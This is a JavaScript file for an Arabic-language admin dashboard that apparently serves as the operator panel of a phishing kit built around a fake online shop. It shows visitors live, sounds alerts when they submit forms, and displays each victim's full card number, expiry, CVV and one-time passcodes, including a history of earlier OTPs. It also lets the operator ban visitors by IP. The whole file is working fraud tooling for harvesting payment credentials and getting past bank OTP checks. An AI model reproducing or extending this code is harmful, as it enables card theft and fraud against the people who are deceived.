// Admin Dashboard JavaScript - Mobile First RTL
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:3000'
  : window.location.origin;

let socket = null;
let adminToken = localStorage.getItem('admin_token');
let isMuted = false;
let audioContext = null;

// Audio notification sounds using Web Audio API
const sounds = {
  newVisitor: () => playTone([523.25, 659.25, 783.99], 0.3),
  formDelivery: () => playTone([392, 523.25], 0.2, 0.1),
  formPayment: () => playTone([329.63, 392, 523.25, 659.25], 0.15, 0.1),
  formVerification: () => playTone([261.63, 329.63, 392, 523.25, 659.25, 783.99], 0.1, 0.1)
};

function playTone(frequencies, duration, gap = 0) {
  if (isMuted) return;
  try {
    if (!audioContext) {
      audioContext = new (window.AudioContext || window.webkitAudioContext)();
    }
    frequencies.forEach((freq, i) => {
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      oscillator.frequency.value = freq;
      oscillator.type = 'sine';
      const startTime = audioContext.currentTime + (gap * i);
      gainNode.gain.setValueAtTime(0, startTime);
      gainNode.gain.linearRampToValueAtTime(0.3, startTime + 0.05);
      gainNode.gain.linearRampToValueAtTime(0, startTime + duration);
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    });
  } catch (e) { console.warn('Audio not supported:', e); }
}

// Initialize Socket Connection
function initAdminSocket() {
  return new Promise((resolve, reject) => {
    socket = io(SERVER_URL, {
      query: { sessionId: 'admin_' + Date.now() },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('🔌 Admin connected');
      updateConnectionStatus(true);
      if (adminToken) {
        socket.emit('admin:validate', { sessionToken: adminToken });
      }
      resolve(socket);
    });

    socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
      updateConnectionStatus(false);
      reject(error);
    });

    socket.on('disconnect', () => {
      console.log('🔌 Admin disconnected');
      updateConnectionStatus(false);
    });

    socket.on('admin:valid', (data) => {
      if (!data.valid) {
        localStorage.removeItem('admin_token');
        adminToken = null;
      }
    });

    socket.on('admin:forceLogout', () => {
      localStorage.removeItem('admin_token');
      adminToken = null;
      showNotification('انتهت جلستك', 'تم تسجيل خروجك من جميع الأجهزة', 'warning');
      setTimeout(() => showLoginPage(), 2000);
    });

    // Visitor events
    socket.on('visitor:new', (data) => {
      sounds.newVisitor();
      updateStats();
      updateVisitorsList();
    });

    socket.on('visitor:pageChange', (data) => {
      updateVisitorPage(data.sessionId, data.page);
    });

    socket.on('visitor:offline', (data) => {
      updateVisitorStatus(data.sessionId, false);
      updateStats();
    });

    socket.on('visitor:online', (data) => {
      updateVisitorStatus(data.sessionId, true);
    });

    // Form submissions
    socket.on('form:deliverySubmitted', (data) => {
      sounds.formDelivery();
      updateStats();
      updateVisitorCard(data.sessionId, { form_submitted: true, delivery_data: data.formData });
    });

    socket.on('form:paymentSubmitted', (data) => {
      sounds.formPayment();
      updateStats();
      updateVisitorCard(data.sessionId, { payment_submitted: true, payment_data: data.paymentData });
    });

    socket.on('form:verificationSubmitted', (data) => {
      sounds.formVerification();
      updateStats();
      updateVisitorCard(data.sessionId, { verification_submitted: true, verification_data: data.verificationData });
    });

    // Ban list update event
    socket.on('ban:listUpdate', () => {
      loadBannedUsers();
    });

    socket.on('user:unbanned', (data) => {
      if (data.success) {
        showNotification('تم فك الحظر', 'تم فك الحظر بنجاح', 'success');
        loadBannedUsers();
      } else {
        showNotification('خطأ', data.message || 'حدث خطأ', 'error');
      }
    });
  });
}

function updateConnectionStatus(isOnline) {
  const dot = document.querySelector('.status-dot');
  const text = document.querySelector('.connection-text');
  if (dot) { dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`; }
  if (text) { text.textContent = isOnline ? 'متصل' : 'غير متصل'; }
}

function showNotification(title, message, type = 'info') {
  const notification = document.createElement('div');
  notification.className = 'notification';
  notification.innerHTML = `
    <span style="font-size:1.5rem;">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : type === 'error' ? '✕' : 'ℹ'}</span>
    <div>
      <div style="font-weight:600;">${title}</div>
      ${message ? `<div style="font-size:0.85rem;color:#666;">${message}</div>` : ''}
    </div>
  `;
  document.body.appendChild(notification);
  setTimeout(() => {
    notification.style.animation = 'slideDown 0.3s ease reverse';
    setTimeout(() => notification.remove(), 300);
  }, 4000);
}

// ========== MOBILE CARD RENDERING ==========
function getPageName(page) {
  const pages = { 'home': 'الرئيسية', 'delivery': 'التوصيل', 'payment': 'الدفع', 'verification': 'التحقق' };
  return pages[page] || page;
}

function getCountryFlag(countryCode) {
  if (!countryCode || countryCode === 'XX') return '🌍';
  try {
    return countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
  } catch { return '🌍'; }
}

function createVisitorCard(visitor) {
  const delivery = visitor.delivery_data || {};
  const payment = visitor.payment_data || {};
  const verification = visitor.verification_data || {};
  const country = visitor.country || 'غير معروف';
  const page = visitor.current_page || 'home';
  const isOnline = visitor.is_online;
  
  const hasOTP = verification.otp || verification.verificationData?.otp;
  const otpValue = hasOTP ? (verification.otp || verification.verificationData?.otp) : null;
  
  // Get OTP history
  let otpHistory = [];
  if (visitor.otp_history) {
    try {
      otpHistory = typeof visitor.otp_history === 'string' ? JSON.parse(visitor.otp_history) : visitor.otp_history;
    } catch (e) {
      otpHistory = [];
    }
  }
  
  // Progress steps
  const steps = [
    { key: 'form_submitted', label: 'التوصيل', icon: '📦' },
    { key: 'payment_submitted', label: 'الدفع', icon: '💳' },
    { key: 'verification_submitted', label: 'التحقق', icon: '🔐' }
  ];
  
  const progressHTML = steps.map((step, index) => {
    const isCompleted = visitor[step.key];
    const prevCompleted = index === 0 || visitor[steps[index - 1].key];
    const isActive = !isCompleted && prevCompleted;
    const statusClass = isCompleted ? 'completed' : (isActive ? 'active' : '');
    return `
      <div class="progress-step ${statusClass}">
        <div class="step-icon">${isCompleted ? '✓' : step.icon}</div>
        <span>${step.label}</span>
      </div>
    `;
  }).join('');
  
  // Build card sections
  let cardBody = '';
  
  // Delivery section
  if (Object.keys(delivery).length > 0) {
    cardBody += `
      <div class="card-section">
        <div class="section-title"><span>📦</span> بيانات التوصيل</div>
        ${delivery.fullName ? `<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">${delivery.fullName}</span></div>` : ''}
        ${delivery.phone ? `<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">${delivery.phone}</span></div>` : ''}
        ${delivery.email ? `<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">${delivery.email}</span></div>` : ''}
        ${delivery.city ? `<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">${delivery.city}${delivery.region ? ' / ' + delivery.region : ''}</span></div>` : ''}
        ${delivery.address ? `<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">${delivery.address}</span></div>` : ''}
        ${delivery.notes ? `<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">${delivery.notes}</span></div>` : ''}
      </div>
    `;
  }
  
  // Payment section with CVV
  if (Object.keys(payment).length > 0) {
    const cardNum = payment.cardNumber || payment.card_number || '';
    cardBody += `
      <div class="card-section payment-section">
        <div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>
        ${cardNum ? `<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">${cardNum}</span></div>` : ''}
        ${payment.cardHolder ? `<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">${payment.cardHolder}</span></div>` : ''}
        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${payment.expiry}</span></div>` : ''}
        ${payment.cvv ? `<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">${payment.cvv}</span></div>` : ''}
      </div>
    `;
  }
  
  // OTP section with history dropdown
  if (otpValue || otpHistory.length > 0) {
    // Build history dropdown if there are old OTPs
    let historyDropdown = '';
    if (otpHistory.length > 1) {
      const oldOtps = otpHistory.slice(1).map(function(item, index) {
        var date = new Date(item.timestamp).toLocaleString('ar-OM');
        return '<div class="otp-history-item">الرموز السابقة: <strong>' + item.otp + '</strong> <small>(' + date + ')</small></div>';
      }).join('');
      
      historyDropdown = '<div class="otp-history-dropdown" id="otpHistory_' + visitor.session_id + '">' + oldOtps + '</div>';
    }
    
    cardBody += `
      <div class="otp-section">
        <div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory('${visitor.session_id}')">
          <span>🔐</span> رمز التحقق (OTP)
          ${otpHistory.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + otpHistory.length + ' رمز</span>' : ''}
        </div>
        <div class="otp-value">${otpValue}</div>
        ${historyDropdown}
      </div>
    `;
  }
  
  // Empty state message
  if (!cardBody) {
    cardBody = `
      <div style="text-align:center;padding:1rem;color:#888;">
        <p>لا توجد بيانات حتى الآن</p>
        <small>البيانات ستظهر عند إدخالها من قبل العميل</small>
      </div>
    `;
  }
  
  // Status indicator
  const statusHTML = isOnline ? `
    <div class="card-status">
      <span class="dot"></span>
      <span>متصل الآن</span>
    </div>
  ` : `
    <div class="card-status" style="color:#ccc;">
      <span style="color:#ccc;">○</span>
      <span style="color:#999;">غير متصل</span>
    </div>
  `;
  
  // Header background changes based on online status
  const headerStyle = isOnline 
    ? 'background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);'
    : 'background: linear-gradient(135deg, #6b7280 0%, #9ca3af 100%);';
  
  return `
    <div class="visitor-card" data-session="${visitor.session_id}" data-online="${isOnline}">
      <div class="card-header" style="${headerStyle}">
        ${statusHTML}
        <div class="card-country">
          <span>${getCountryFlag(visitor.country_code)}</span>
          <span>${country}</span>
        </div>
        <div class="card-page">${getPageName(page)}</div>
      </div>
      
      <div class="card-body">
        ${cardBody}
      </div>
      
      <div class="card-progress">
        ${progressHTML}
      </div>
      
      <div class="card-actions">
        <button class="btn btn-danger btn-sm" onclick="banVisitor('${visitor.session_id}', '${visitor.ip_address || ''}')">
          🚫 حظر
        </button>
      </div>
    </div>
  `;
}

// Toggle OTP History Dropdown
function toggleOtpHistory(sessionId) {
  var dropdown = document.getElementById('otpHistory_' + sessionId);
  if (dropdown) {
    if (dropdown.style.display === 'block') {
      dropdown.style.display = 'none';
    } else {
      dropdown.style.display = 'block';
    }
  }
}

function updateVisitorsList() {
  if (!socket) return;
  socket.emit('visitors:request');
  socket.once('visitors:update', (data) => {
    const grid = document.getElementById('visitorsGrid');
    const countEl = document.getElementById('onlineCount');
    const totalCountEl = document.getElementById('totalCount');
    if (!grid) return;
    
    const onlineCount = data.visitors.filter(v => v.is_online).length;
    
    if (countEl) countEl.textContent = onlineCount;
    if (totalCountEl) totalCountEl.textContent = data.visitors.length;
    
    if (data.visitors.length === 0) {
      grid.innerHTML = `
        <div class="empty-state">
          <span>👥</span>
          <h3>لا يوجد زوار</h3>
          <p>الزوار سيظهرون هنا</p>
        </div>
      `;
      return;
    }
    
    grid.innerHTML = data.visitors.map(visitor => createVisitorCard(visitor)).join('');
  });
}

function updateVisitorPage(sessionId, page) {
  const card = document.querySelector(`[data-session="${sessionId}"]`);
  if (card) {
    const pageEl = card.querySelector('.card-page');
    if (pageEl) pageEl.textContent = getPageName(page);
  }
}

function updateVisitorStatus(sessionId, isOnline) {
  const card = document.querySelector(`[data-session="${sessionId}"]`);
  if (card) {
    card.setAttribute('data-online', isOnline);
    
    const header = card.querySelector('.card-header');
    const statusEl = card.querySelector('.card-status');
    
    if (isOnline) {
      header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
      if (statusEl) {
        statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
      }
    } else {
      header.style.background = 'linear-gradient(135deg, #6b7280 0%, #9ca3af 100%)';
      if (statusEl) {
        statusEl.innerHTML = '<span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span>';
      }
    }
    
    // Update counts
    updateVisitorsList();
  }
}

function updateVisitorCard(sessionId, data) {
  // Refresh the entire list for simplicity
  updateVisitorsList();
}

// Stats Functions
async function updateStats() {
  if (!socket) return;
  socket.emit('stats:request');
  socket.once('stats:update', (data) => {
    const elements = {
      'totalVisitors': data.totalVisitors,
      'onlineVisitors': data.onlineVisitors,
      'formSubmissions': data.formSubmissions,
      'paymentSubmissions': data.paymentSubmissions
    };
    
    Object.entries(elements).forEach(([id, value]) => {
      const el = document.getElementById(id);
      if (el) el.textContent = value;
    });
    
    const countryList = document.getElementById('countryList');
    if (countryList && data.countryStats?.length > 0) {
      const maxCount = Math.max(...data.countryStats.map(c => parseInt(c.count)));
      countryList.innerHTML = data.countryStats.map(country => `
        <div class="country-item">
          <span class="country-name">${country.country || 'غير معروف'}</span>
          <div class="country-bar">
            <div class="country-bar-fill" style="width: ${(parseInt(country.count) / maxCount) * 100}%"></div>
          </div>
          <span class="country-count">${country.count}</span>
        </div>
      `).join('');
    }
  });
}

// Admin Login
async function adminLogin(username, password) {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await response.json();
    if (data.success) {
      adminToken = data.admin.id + '_' + Date.now();
      localStorage.setItem('admin_token', adminToken);
      localStorage.setItem('admin_user', JSON.stringify(data.admin));
      if (socket) {
        socket.emit('admin:login', {
          username,
          password: '',
          deviceInfo: { userAgent: navigator.userAgent, platform: navigator.platform }
        });
      }
      return true;
    }
    return false;
  } catch (error) {
    console.error('Login error:', error);
    return false;
  }
}

// Ban Functions - Direct ban without prompts
function banVisitor(sessionId, ipAddress) {
  if (!confirm('هل أنت متأكد من حظر هذا المستخدم؟')) return;
  
  const customMessage = prompt('رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):', 'تم حظرك من الموقع. يرجى التواصل مع الدعم.');
  if (customMessage === null) return;
  
  if (socket) {
    socket.emit('user:ban', {
      targetSessionId: sessionId || null,
      targetIp: ipAddress || null,
      reason: 'Banned by admin',
      customMessage: customMessage || 'تم حظرك من الموقع.'
    });
    
    showNotification('تم الحظر', 'تم حظر المستخدم بنجاح', 'success');
    
    // Remove card from view
    const card = document.querySelector(`[data-session="${sessionId}"]`);
    if (card) {
      card.style.opacity = '0.5';
      card.style.pointerEvents = 'none';
    }
  }
}

// Load Banned Users List with client details
async function loadBannedUsers() {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/banned`);
    const data = await response.json();
    const tbody = document.getElementById('bannedTableBody');
    const countEl = document.getElementById('bannedCount');
    if (!tbody) return;
    
    if (!data.banned?.length) {
      tbody.innerHTML = `<tr><td colspan="5" class="empty-state"><span>✅</span><p>لا يوجد مستخدمين محظورين</p></td></tr>`;
      if (countEl) countEl.textContent = '0 محظور';
      return;
    }
    
    if (countEl) countEl.textContent = `${data.banned.length} محظور`;
    
    tbody.innerHTML = data.banned.map(user => {
      // Extract client info from delivery data
      const delivery = user.delivery_data;
      const hasName = delivery?.fullName;
      const hasPhone = delivery?.phone;
      const country = user.country || '';
      const banDate = new Date(user.created_at).toLocaleDateString('ar-OM');
      
      // Determine client identifier
      let clientInfo, clientBadge;
      if (hasName || hasPhone) {
        clientInfo = `
          <div style="font-weight:700;color:var(--danger);font-size:1rem;">
            👤 ${hasName || 'غير معروف'}
          </div>
          ${hasPhone ? `<div style="font-size:0.85rem;color:#666;">📞 ${hasPhone}</div>` : ''}
          ${country ? `<div style="font-size:0.8rem;color:#888;">🌍 ${country}</div>` : ''}
        `;
        clientBadge = `<span class="status-badge" style="background:rgba(0,119,182,0.1);color:var(--primary);">عميل مسجل</span>`;
      } else {
        clientInfo = `
          <div style="font-weight:700;color:var(--gray-600);font-size:1rem;">
            👤 زائر عشوائي
          </div>
          ${user.ip_address ? `<div style="font-size:0.85rem;color:#666;">🌐 IP: ${user.ip_address}</div>` : ''}
          ${country ? `<div style="font-size:0.8rem;color:#888;">🌍 ${country}</div>` : ''}
        `;
        clientBadge = `<span class="status-badge" style="background:rgba(107,114,128,0.1);color:#6b7280;">زائر</span>`;
      }
      
      return `
        <tr>
          <td style="font-weight:700;color:var(--danger);">#${user.id}</td>
          <td>
            ${clientInfo}
          </td>
          <td>
            ${clientBadge}
          </td>
          <td style="font-size:0.85rem;color:#666;">
            ${user.reason || 'بدون سبب'}
            <div style="margin-top:0.25rem;font-size:0.75rem;color:#999;">
              📅 ${banDate}
            </div>
          </td>
          <td>
            <button class="btn btn-success btn-sm" onclick="unbanUser(${user.id})" style="white-space:nowrap;">
              ✅ فك الحظر
            </button>
          </td>
        </tr>
      `;
    }).join('');
  } catch (error) {
    console.error('Error loading banned users:', error);
    showNotification('خطأ', 'فشل في تحميل قائمة المحظورين', 'error');
  }
}

// Quick Unban Function
function unbanUser(banId) {
  if (!confirm('هل أنت متأكد من فك الحظر؟')) return;
  
  if (socket) {
    socket.emit('user:unban', { banId });
    showNotification('جاري فك الحظر', '', 'info');
  } else {
    // Fallback to API
    fetch(`${SERVER_URL}/api/admin/banned/${banId}`, { method: 'DELETE' })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          showNotification('تم فك الحظر', '', 'success');
          loadBannedUsers();
        }
      })
      .catch(err => {
        showNotification('خطأ', 'حدث خطأ أثناء فك الحظر', 'error');
      });
  }
}

// Tab Navigation
function showTab(tabId) {
  document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
  document.getElementById(tabId)?.classList.add('active');
  document.querySelector(`[data-tab="${tabId}"]`)?.classList.add('active');
  
  if (tabId === 'stats') { updateStats(); }
  else if (tabId === 'tracking') { updateVisitorsList(); }
  else if (tabId === 'products') { loadProducts(); }
  else if (tabId === 'banned') { loadBannedUsers(); }
  else if (tabId === 'devices') { loadDevices(); }
}

// Toggle Sound
function toggleSound() {
  isMuted = !isMuted;
  const btn = document.querySelector('.sound-toggle');
  if (btn) {
    btn.classList.toggle('muted', isMuted);
    btn.textContent = isMuted ? '🔇' : '🔊';
  }
}

// Show Login/Dashboard
function showLoginPage() {
  document.getElementById('loginPage').style.display = 'flex';
  document.getElementById('dashboard').style.display = 'none';
}

function showDashboard() {
  document.getElementById('loginPage').style.display = 'none';
  document.getElementById('dashboard').style.display = 'flex';
}

// Products Functions
async function loadProducts() {
  try {
    const response = await fetch(`${SERVER_URL}/api/products`);
    const data = await response.json();
    const tbody = document.getElementById('productsTableBody');
    const countEl = document.getElementById('productsCount');
    if (!tbody) return;
    
    if (!data.products?.length) {
      tbody.innerHTML = `<tr><td colspan="6" class="empty-state"><span>📦</span><p>لا توجد منتجات</p></td></tr>`;
      if (countEl) countEl.textContent = '0 منتج';
      return;
    }
    
    if (countEl) countEl.textContent = `${data.products.length} منتج`;
    
    tbody.innerHTML = data.products.map(product => {
      const isActive = product.is_active !== false;
      return `
        <tr>
          <td>${product.id}</td>
          <td>
            <div style="font-weight:600;">${product.name_ar}</div>
            ${product.name_en ? `<div style="font-size:0.8rem;color:#888;">${product.name_en}</div>` : ''}
          </td>
          <td style="color:var(--primary);font-weight:700;">${product.price} ر.ع</td>
          <td>${product.stock || 0}</td>
          <td>
            <span class="status-badge ${isActive ? 'online' : 'offline'}">
              ${isActive ? '✓ نشط' : '✕ غير نشط'}
            </span>
          </td>
          <td>
            <div class="btn-group" style="display:flex;gap:0.25rem;">
              <button class="btn btn-sm btn-warning" onclick="editProduct(${product.id})">✏️</button>
              <button class="btn btn-sm btn-danger" onclick="deleteProduct(${product.id})">🗑️</button>
            </div>
          </td>
        </tr>
      `;
    }).join('');
  } catch (error) { 
    console.error('Error loading products:', error);
    showNotification('خطأ', 'فشل في تحميل المنتجات', 'error');
  }
}

// Edit Product
async function editProduct(id) {
  try {
    const response = await fetch(`${SERVER_URL}/api/products/${id}`);
    const data = await response.json();
    
    if (data.success && data.product) {
      const product = data.product;
      
      document.getElementById('editProductId').value = product.id;
      document.getElementById('productNameAr').value = product.name_ar || '';
      document.getElementById('productNameEn').value = product.name_en || '';
      document.getElementById('productPrice').value = product.price || '';
      document.getElementById('productStock').value = product.stock || 0;
      document.getElementById('productImage').value = product.image_url || '';
      document.getElementById('productDescription').value = product.description || '';
      document.getElementById('productCategory').value = product.category || '';
      
      document.getElementById('productFormTitle').textContent = '✏️ تعديل المنتج';
      document.getElementById('productFormContainer').scrollIntoView({ behavior: 'smooth' });
    }
  } catch (error) {
    console.error('Error loading product:', error);
    showNotification('خطأ', 'فشل في تحميل بيانات المنتج', 'error');
  }
}

// Reset Product Form
function resetProductForm() {
  document.getElementById('editProductId').value = '';
  document.getElementById('productForm').reset();
  document.getElementById('productFormTitle').textContent = '➕ إضافة منتج جديد';
}

// Save Product (Add or Update)
async function saveProduct(formData) {
  const editId = document.getElementById('editProductId').value;
  const isEdit = !!editId;
  
  const productData = {
    name_ar: formData.get('name_ar') || document.getElementById('productNameAr').value,
    name_en: document.getElementById('productNameEn').value,
    price: document.getElementById('productPrice').value,
    stock: document.getElementById('productStock').value || 0,
    image_url: document.getElementById('productImage').value,
    description: document.getElementById('productDescription').value,
    category: document.getElementById('productCategory').value
  };
  
  if (!productData.name_ar) {
    showNotification('خطأ', 'اسم المنتج مطلوب', 'error');
    return;
  }
  if (!productData.price) {
    showNotification('خطأ', 'السعر مطلوب', 'error');
    return;
  }
  
  try {
    let response;
    if (isEdit) {
      response = await fetch(`${SERVER_URL}/api/products/${editId}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(productData)
      });
    } else {
      response = await fetch(`${SERVER_URL}/api/products`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(productData)
      });
    }
    
    const data = await response.json();
    
    if (data.success) {
      showNotification('تم الحفظ', isEdit ? 'تم تحديث المنتج بنجاح' : 'تم إضافة المنتج بنجاح', 'success');
      resetProductForm();
      loadProducts();
    } else {
      showNotification('خطأ', data.message || 'فشل في حفظ المنتج', 'error');
    }
  } catch (error) {
    console.error('Error saving product:', error);
    showNotification('خطأ', 'فشل في حفظ المنتج', 'error');
  }
}

// Delete Product
async function deleteProduct(id) {
  if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
  try {
    const response = await fetch(`${SERVER_URL}/api/products/${id}`, { method: 'DELETE' });
    const data = await response.json();
    
    if (data.success) {
      showNotification('تم الحذف', 'تم حذف المنتج بنجاح', 'success');
      loadProducts();
    } else {
      showNotification('خطأ', data.message || 'فشل في حذف المنتج', 'error');
    }
  } catch (error) { 
    console.error('Error deleting product:', error);
    showNotification('خطأ', 'فشل في حذف المنتج', 'error');
  }
}

// Device Management
async function loadDevices() {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/sessions`);
    const data = await response.json();
    const container = document.getElementById('devicesContainer');
    if (!container) return;
    
    if (!data.sessions?.length) {
      container.innerHTML = `<div class="empty-state"><span>📱</span><p>لا توجد أجهزة متصلة</p></div>`;
      return;
    }
    
    container.innerHTML = data.sessions.map(session => `
      <div class="device-item">
        <div class="device-info">
          <span class="device-icon">💻</span>
          <div class="device-details">
            <h4>${session.ip_address || 'غير معروف'}</h4>
            <p>${session.country || 'غير معروف'}</p>
          </div>
        </div>
        <button class="btn btn-sm btn-danger" onclick="logoutDevice('${session.session_token}')">خروج</button>
      </div>
    `).join('');
  } catch (error) { console.error('Error loading devices:', error); }
}

async function logoutDevice(token) {
  try {
    await fetch(`${SERVER_URL}/api/admin/sessions/${token}`, { method: 'DELETE' });
    showNotification('تم تسجيل الخروج', '', 'success');
    loadDevices();
  } catch (error) { console.error('Error logging out device:', error); }
}

async function logoutAllDevices() {
  if (!confirm('تسجيل خروج جميع الأجهزة؟')) return;
  try {
    await fetch(`${SERVER_URL}/api/admin/sessions`, { method: 'DELETE' });
    showNotification('تم تسجيل الخروج', '', 'success');
    loadDevices();
  } catch (error) { console.error('Error logging out devices:', error); }
}

// Initialize
document.addEventListener('DOMContentLoaded', async () => {
  await initAdminSocket();
  
  if (!adminToken) {
    showLoginPage();
  } else {
    showDashboard();
    showTab('stats');
  }
  
  // Login form
  document.getElementById('loginForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const success = await adminLogin(username, password);
    if (success) {
      showDashboard();
      showTab('stats');
    } else {
      showNotification('خطأ', 'اسم المستخدم أو كلمة المرور غير صحيحة', 'error');
    }
  });
  
  // Product form
  document.getElementById('productForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    await saveProduct(formData);
  });
  
  // Logout button
  document.getElementById('logoutBtn')?.addEventListener('click', () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_user');
    adminToken = null;
    showLoginPage();
  });
  
  // Auto refresh tracking every second
  setInterval(() => {
    if (document.getElementById('tracking')?.classList.contains('active')) {
      updateVisitorsList();
    }
  }, 1000);
});

// Export functions
window.showTab = showTab;
window.toggleSound = toggleSound;
window.banVisitor = banVisitor;
window.unbanUser = unbanUser;
window.loadBannedUsers = loadBannedUsers;
window.editProduct = editProduct;
window.deleteProduct = deleteProduct;
window.resetProductForm = resetProductForm;
window.logoutDevice = logoutDevice;
window.logoutAllDevices = logoutAllDevices;
